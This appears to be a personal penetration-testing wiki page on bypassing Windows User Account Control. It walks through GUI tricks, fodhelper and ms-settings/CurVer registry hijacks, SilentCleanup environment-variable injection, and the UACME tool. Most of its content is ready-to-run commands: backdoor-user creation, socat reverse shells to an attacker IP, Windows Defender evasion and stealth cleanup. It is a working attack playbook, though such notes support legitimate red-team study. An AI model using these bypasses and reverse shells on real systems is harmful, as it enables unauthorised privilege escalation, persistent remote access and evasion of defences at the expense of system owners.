# Bypassing Windows User Account Control

For the fundamentals of UAC see [[Windows-User-Account-Control]]

When creating a backdoor post exploit you may see this error:
```powershell
net user backdoor Backd00r /add
System error 5 has occurred.

Access is denied.
```

`whoami /groups` will show that the session is running in medium Integrity Levels, UAC prevents even Administrators from performing administrative tasks with filtered token.

## GUI Based Bypasses

#### msconfig

From the `Search -> Run`  open `msconfig`, using the [[Process-Hacker]] if it runs with High IL: navigate to the `Tools` tab and select `Command Prompt` 

#### azman.msc 
From the `Search -> Run`  open, using the [[Process-Hacker]] if it runs with High IL: Click the tab `Help -> Help Topics -> Right-Click -> View-Source`, which will open notepad `File -> Open C:\Windows\System32\cmd.exe`, but then when you find it in the file listing `Right-Click -> Open`

## UAC AutoElevate Processes

Some executable can auto-elevate to high IL - most of Control Panel's functionality and some native executables. Requirements for auto-elevation:
1. The executable must be signed by Windows Publisher
2. The executable must be contained in trusted directory, like `%SystemRoot%/System32/` or ``%ProgramFiles%/`

Additional requirements depending on application:
	1. Executable files must declare the autoElevate element inside their manifests - use [[Sysinternals-Sigcheck]] to check manifest.
	2. mmc.exe will auto elevate depending on the .msc snap-in taht the user requests - most Windows .msc files will auto-elevate.
	3. Windows keeps an additional list of executables that auto elevate even when not requested in the manifest. [[UAC-AutoElevate-List]]
	4. COM objects can request auto-elevation by configuring registry keys [Docs](https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker)

#### fodhelper
fodhelper is default windows executable in charge of managing Windows optional features, infamously used in [Glupteba Malware](https://www.cybereason.com/blog/research/glupteba-expands-operation-and-toolkit-with-lolbins-cryptominer-and-router-exploit). Fodhelper can auto elevate when using default settings and can be exploited without GUI access. 

Create a association for ProgID for a file in current users HKCU, allow us to override the default system-wide association and control the `command` used to open that file. To elaborate, the Programming ID(ProgID) key in the registry is associated with the application. Windows prioritises the HKCU over the HKLM key. The command used to specify the subkey located within the registry tree  `shell/open/command`. 

```batch
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\<reverse-shell.exe> <reverse-shell-commands>""
reg add %REG_KEY% /v "DelegateExecute" /d "" /f 
reg add %REG_KEY% /d %CMD% /f
```

Delete for stealth:
```batch
reg delete HKCU\Software\Classes\ms-settings\ /f
```

Query to check:
```batch
reg query %REG_KEY% /v ""
```

## Windows Defender
Same as the above, but the final line is:
```batch
reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
```

Warning this may still fail. It succeeds base whether the payload or AV executes first. It is still detected by Windows Defender. The improved version is from :[v3ded](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses)

Instead of \\Shell\\Open\\command, we use `CurVer` entry under a progID registry key, which commonly used when you have multiple instances of an application with different version running on the same system, `CurVer` points to a default version.

Modified [v3ded](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses) version from Tryhackme.
```powershell
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

# create new progID with name .pwn  
New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force

# points to CrVer entry of ms-settings
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

It is more likely to evade Windows Defender as name of the progID that holds our payload is entirely arbitrary. Instead of Windows Defender matching a single indicator, the pointing is transitive and therefore evasive as it encapsulated in the act of point, data-wise. But AV detection methods are implemented strictly against the published exploit so: 
```batch
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

C:\> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
The operation completed successfully.

C:\> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
The operation completed successfully.

C:\> fodhelper.exe
```

Clean up:
```batch
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```

## UAC Enivronment Variable Expansion

If UAC is configured to `Always Notify`, similar autoElevate exploiatable application won't work. Instead scheduled tasks that can be run by any user, but executed at highest privileges available to the caller - disabling Windows Defender prior to this is required.

Using `Task Scheduler` tasks can set `When running the task, use the following user account: Run only when user is logged on; Run whether user is is logged on or not - [] Do not store password. The task will only have access to local resources` plus it has another checkbox for `Run with highest privileges`, this will use the highest Integrity Level the user has - this is an so Administrator only exploit.

For example(with` Task Scheduler` open) with `DiskCleanup`:
`Double Click Task -> GOTO -> Actions tab`; if the run on-demand command depends on enviroment variables it is possible to inject commands and then have the task execute them by starting it manually.

`%windir%` can be overriden by creating an entry in the `HKCU\Environment`
set `%windir%` to `"cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM "`

**Be sure to note the executed command to avoid any artefact interfering with anything else.  Since many Windows components rely on the %windir% environment variable, a lot of things won't properly work until you remove the registry key used for this bypass.**

```batch
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f

schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

And for the cleanup
```batch
reg delete "HKCU\Environment" /v "windir" /f
```

## UACME

[UACME Github](https://github.com/hfiref0x/UACME) *"Defeating Windows User Account Control by abusing built-in Windows AutoElevate backdoor."* Be warned the naming convention is not-descriptive. And therefore will probably require cataloguing them myself.
- x86-32/x64 Windows 7/8/8.1/10/11 (client, some methods however works on server version too).
- Admin account with UAC set on default settings required.

Run executable from command line: akagi32 [[UACME-Keys]] Param or akagi64 [[UACME-Keys]] Param. 

First parameter is number of method to use, second is optional command (executable file name including full path) to run. Second parameter can be empty - in this case program will execute elevated cmd.exe from system32 folder. See listing of keys locally: [[UACME-Keys]] or [externally](https://github.com/hfiref0x/UACME)

## Reference

[COM Elevation Moniker Documentation](https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker)
[Glupteba Malware](https://www.cybereason.com/blog/research/glupteba-expands-operation-and-toolkit-with-lolbins-cryptominer-and-router-exploit)
[v3ded Utilizing Programmatic Identifiers (ProgIDs) for UAC Bypasses](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses)
[UACME Github](https://github.com/hfiref0x/UACME) 